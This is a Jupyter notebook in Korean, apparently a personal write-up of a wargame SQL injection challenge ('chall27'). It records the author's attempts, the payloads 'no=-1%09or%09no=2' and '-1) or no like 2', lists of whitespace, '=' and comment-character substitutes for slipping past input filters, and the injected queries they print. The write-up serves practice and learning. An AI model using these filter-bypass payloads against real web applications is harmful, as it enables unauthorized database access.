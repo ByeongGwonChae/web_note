{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 문제"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "SQL인젝션 문제다. 이 분야에 대해서는 제대로 알질 못해서 심히 걱정이다."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![27-01](img/27-01.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "근데 이거 어디서 본 것 같은데 기분 탓인가. 전에 풀다가 모르겠어서 인터넷에서 풀이 찾아서 공부한 기억이 있는 문제다. 한 번 똑같이 공격해보자."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 풀이"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "no=-1 or no=2\n",
    "\n",
    "대충 이런 공격이었으니까 공백문자만 바꿔가면서 시도해보기로 한다.\n",
    "\n",
    "' '(공백문자 변환) → /**/, %09, %0a, %0b, %0c, %0d, %a0, +, %20\n",
    "\n",
    "왜 안되지. 전에 문제랑 똑같은거 같은데."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "전에 문제 찾아서 내용을 정리해 오겠다.<br>\n",
    "전의 문제는 no=-1%09or%09no=2 를 사용해서 풀었었는데, 이번 문제는 뭔가가 필터에 걸려서 안된다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "아 뭔가 했더니 '='가 필터링 되고 있었구나.\n",
    "\n",
    "'='필터링 정도가 간단하다. 다음과 같은 함수들로 변환시켜서 사용하면 된다.\n",
    "\n",
    "= → like, between, in, instr\n",
    "\n",
    "여기서 in는 괄호를 사용해야되서 사용불가능하고, instr은 여기서 쓸만한 함수는 아닌 것 같다.\n",
    "\n",
    "like와 between으로 이것저것 시도해본 결과가 다음이다."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "select id from chall27 where id='guest' and no=({-1}) or no like 2#})\n"
     ]
    }
   ],
   "source": [
    "data1 = \"-1}) or ({no like 2\"   # (는 필터링 되어 있음\n",
    "data2 = \"-1}) or no like 2#\"   # #은 필터링 되어 있음\n",
    "print(\"select id from chall27 where id='guest' and no=({\" + data2 + \"})\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "select id from chall27 where id='guest' and no=(-1) or no like 2#)\n"
     ]
    }
   ],
   "source": [
    "data1 = \"-1) or (no like 2\"   # (는 필터링 되어 있음\n",
    "data2 = \"-1) or no like 2#\"   # #은 필터링 되어 있음\n",
    "print(\"select id from chall27 where id='guest' and no=(\" + data2 + \")\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "{$_GET['no']}에서 {}가 사라질지 안사라질지 모르겠어서 일단 두 가지 전부 적어봤다.\n",
    "여기서 ( 는 필터링 걸렸을 경우 해결책을 찾을 수가 없고, 그나마 # 은 구글링으로 뭔가 나오긴 했다.\n",
    "\n",
    "#, -- 등은 ;\\%00, /* 로 대신할 수 있다고 한다.\n",
    "\n",
    "해보자."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![27-02](img/27-02.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "예스! 예스! 예스!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "내가 풀이를 안보고 SQL인젝션을 푸는 날이 올 줄이야. 푸는데 2시간 넘게 걸렸지만, 기분이 좋다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.7.6 64-bit ('test1': conda)",
   "language": "python",
   "name": "python37664bittest1conda6096207d9ba848ecb47f4c96b52d76b2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
